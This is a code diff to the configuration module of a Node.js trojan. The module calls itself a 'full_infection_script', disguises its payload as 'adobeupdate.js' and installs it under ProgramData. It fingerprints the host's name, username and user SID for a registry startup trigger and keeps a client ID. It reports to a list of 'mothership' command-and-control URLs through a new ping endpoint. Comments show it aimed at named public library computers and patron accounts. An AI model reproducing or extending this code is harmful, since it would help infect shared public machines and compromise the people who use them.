@@ -31,6 +31,10 @@ var mothershipconfig = {
         "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault",
     ],
 
+    get pingurl() {
+        return this.mothership + "/ow/ping.php";
+    },
+
     selectMothership: function () {
         let mothershiparr = this.mothershiplist;
 
@@ -69,66 +73,51 @@ var mothershipconfig = {
     },
 };
 
-// TODO refactor to move all getters to init routine
 var systemconfig = {
     scriptts: helper.getTimestamp(),
     cmdname: "",
     cmdtaskname: "",
-    istpl: "not set",
-
-    // TODO reconcile machinename, username, userid
+    istpl: "",
 
     staticdelay: 30,
     trojanname: "owd",
     script_version: "full_infection_script",
-
-    trojandir: "not set",
+    trojandir: "",
 
     launch_script_fname: "launch.cmd",
     launch_script_fpath: "",
 
-    getClientJobPath() {
-        return path.join(
-            systemconfig.trojandir,
-            "clientjob_" + helper.getRandomCode(8)
-        );
+    machinename: "", // BWPCP503
+    username: "", // ADULT2022, LC2022, CAT2022
+    usersid: "", // S-1-5-21-3127389091-2830476002-349640086-1001
+
+    trojanfname: "adobeupdate.js",
+
+    get trojanfpath() {
+        return path.join(this.trojandir, this.trojanfname);
     },
 
-    getClientJobConfigPath() {
-        return path.join(
-            this.trojandir,
-            "clientjobconfig_" + helper.getRandomCode(8) + ".json"
-        );
+    get scriptpid() {
+        return process.pid;
     },
 
-    // TODO: read from file
-    // S-1-5-21-3127389091-2830476002-349640086-1001
-    // used for reg trigger mechanism
-    __usersid: "",
-
-    get usersid() {
-        return this.__usersid;
+    get scriptparentpid() {
+        return process.ppid;
     },
 
-    set usersid(value) {
-        this.__usersid = value;
+    scriptfpath: "",
+
+    get scriptdir() {
+        return path.dirname(this.scriptfpath);
     },
 
-    __clientid: "",
-
-    get clientid() {
-        if (helper.isNullOrWhitespace(this.__clientid)) {
-            if (helper.fileExists(systemconfig.clientidfpath))
-                this.__clientid = helper.readTag(systemconfig.clientidfpath);
-        }
-
-        if (helper.isNullOrWhitespace(this.__clientid)) {
-            this.__clientid = helper.getRandomCode(8);
-            helper.writeTag(systemconfig.clientidfpath, this.__clientid);
-        }
-
-        return this.__clientid;
+    get source() {
+        return path.basename(this.scriptfpath);
     },
+
+    scriptmd5: "",
+
+    clientid: "",
 
     get clientidfpath() {
         return path.join(this.trojandir, "client_id");
@@ -180,31 +169,9 @@ var systemconfig = {
         );
     },
 
-    pythonexepath: path.join(systemconfig.pythonexedir, "python.exe"),
-
-    trojanfname: "adobeupdate",
-
-    get trojanfpath() {
-        return path.join(this.trojandir, this.trojanfname);
+    get pythonexepath() {
+        return path.join(systemconfig.pythonexedir, "python.exe");
     },
-
-    get scriptparentpid() {
-        return process.ppid;
-    },
-
-    scriptfpath: "",
-
-    get scriptdir() {
-        return path.dirname(this.scriptfpath);
-    },
-
-    machinename: "",
-
-    username: "",
-
-    source: path.basename(this.scriptfpath),
-
-    scriptmd5: "",
 
     get statekvp() {
         return {
@@ -223,72 +190,6 @@ var systemconfig = {
         return `cmdname=${this.cmdname} cmdtaskname=${this.cmdtaskname} ts=${this.scriptts} pid=${this.scriptpid} ppid=${this.scriptparentpid}`;
     },
 };
-
-systemconfig.machinename = os.hostname();
-
-systemconfig.username = os.userInfo().username;
-
-systemconfig.sessionid = helper.getRandomCode(8);
-
-systemconfig.trojandir = path.join(
-    process.env.ProgramData,
-    systemconfig.trojanname
-);
-
-systemconfig.launch_script_fpath = path.join(
-    systemconfig.trojandir,
-    systemconfig.launch_script_fname
-);
-
-function init_scriptmd5() {
-    let fpath = path.join(systemconfig.trojandir, "scriptmd5");
-
-    let md5str = "";
-
-    if (helper.fileExists(fpath)) {
-        md5str = helper.readTag(fpath);
-    } else {
-        md5str = helper.getFileMD5(systemconfig.scriptfpath);
-
-        if (!helper.isNullOrWhitespace(md5str))
-            helper.writeTag(path.join(systemconfig.trojandir, "scriptmd5"));
-    }
-
-    systemconfig.scriptmd5 = md5str;
-}
-
-init_scriptmd5();
-
-// all TPLs have the same machinename, hostname
-// TODO SJPCP --> st. james
-//      RLPCP --> yonge/bloor reference library
-//      username should be ADULT2022
-function init_istpl() {
-    let machineprefix = systemconfig.machinename.toLowerCase().substring(0, 5);
-
-    if (
-        ["ADULT2022", "LC2022", "CAT2022"].includes(
-            systemconfig.username.toUpperCase()
-        )
-    ) {
-        systemconfig.istpl = true;
-    }
-
-    if (
-        machineprefix == "RLPCP".toLowerCase() ||
-        machineprefix == "SJPCP".toLowerCase()
-    ) {
-        systemconfig.istpl = true;
-    }
-
-    if (helper.fileExists(path.join(this.scriptdir, "tplmode"))) {
-        systemconfig.istpl = true;
-    }
-
-    systemconfig.istpl = false;
-}
-
-init_istpl();
 
 var regstartupconfig = {
     get new_item_str() {
@@ -471,7 +372,111 @@ module.exports = {
 
 const helper_ps = require("./adobeupdate.helper.ps.js");
 
+systemconfig.machinename = os.hostname();
+
+systemconfig.username = os.userInfo().username;
+
+systemconfig.sessionid = helper.getRandomCode(8);
+
+systemconfig.trojandir = path.join(
+    process.env.ProgramData,
+    systemconfig.trojanname
+);
+
+systemconfig.launch_script_fpath = path.join(
+    systemconfig.trojandir,
+    systemconfig.launch_script_fname
+);
+
+function init_clientid() {
+    let tclientid = "";
+
+    if (helper.fileExists(systemconfig.clientidfpath)) {
+        tclientid = helper.readTag(systemconfig.clientidfpath);
+    } else {
+        tclientid = helper.getRandomCode(8);
+        helper.writeTag(systemconfig.clientidfpath, tclientid);
+    }
+
+    systemconfig.clientid = tclientid;
+}
+
+init_clientid();
+
+async function init_usersid() {
+    let fpath = path.join(systemconfig.trojandir, "usersid");
+
+    let tusersid = "";
+
+    if (helper.fileExists(fpath)) {
+        tusersid = helper.readTag(fpath);
+    } else {
+        tusersid = await helper.getusersid();
+
+        helper.writeTag(fpath, tusersid);
+    }
+
+    systemconfig.usersid = tusersid;
+}
+
+// TODO: read from file
+// S-1-5-21-3127389091-2830476002-349640086-1001
+// used for reg trigger mechanism
+
+(async () => {
+    await init_usersid();
+})();
+
 systemconfig.scriptfpath = helper_ps.process_argv[1];
+
+function init_scriptmd5() {
+    let fpath = path.join(systemconfig.trojandir, "scriptmd5");
+
+    let md5str = "";
+
+    if (helper.fileExists(fpath)) {
+        md5str = helper.readTag(fpath);
+    } else {
+        md5str = helper.getFileMD5(systemconfig.scriptfpath);
+
+        if (!helper.isNullOrWhitespace(md5str)) helper.writeTag(fpath, md5str);
+    }
+
+    systemconfig.scriptmd5 = md5str;
+}
+
+init_scriptmd5();
+
+// machine name:
+// SJPCP --> st. james
+// RLPCP --> yonge/bloor reference library
+// BWPCP --> bridlewood library
+function init_istpl() {
+    let machineprefix = systemconfig.machinename.toLowerCase().substring(0, 5);
+
+    if (
+        ["ADULT2022", "LC2022", "CAT2022"].includes(
+            systemconfig.username.toUpperCase()
+        )
+    ) {
+        systemconfig.istpl = true;
+    }
+
+    if (
+        machineprefix == "RLPCP".toLowerCase() ||
+        machineprefix == "SJPCP".toLowerCase()
+    ) {
+        systemconfig.istpl = true;
+    }
+
+    if (helper.fileExists(path.join(systemconfig.trojandir, "tplmode"))) {
+        systemconfig.istpl = true;
+    }
+
+    systemconfig.istpl = false;
+}
+
+init_istpl();
 
 helper.logmsg(mothershipconfig.mothershipconfigfpath);
 helper.logmsg(mothershipconfig.mothershiplist);
